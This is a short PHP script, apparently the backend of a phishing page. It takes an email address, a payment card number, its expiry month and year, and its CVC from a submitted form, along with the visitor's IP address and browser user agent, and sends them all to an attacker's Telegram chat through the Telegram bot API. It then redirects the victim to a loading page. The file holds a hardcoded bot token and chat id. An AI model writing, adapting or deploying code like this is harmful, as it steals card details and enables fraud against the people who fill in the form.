<?php 
	
$token = "6560711386:AAH9viEpuC7-bu9huR0WouD09PuXOvpn1ng"; //Токен бота с @BotFather
$chat_id = "1001992705920"; // Chat_id

$useragents = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];

$arr = array(
  ' ' => '  ',  
  'Почта: ' => $_POST['emaill'],  
 'Карта: ' => $_POST['cardes'],  
 'месяц: ' => $_POST['nameerr'],  
 'год: ' => $_POST['rename'],  
 'cvc: ' => $_POST['cvcc'],  
  'IP:' => $ip,
  'User agent:' => $useragents
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

header("Location: /loading.html");

?>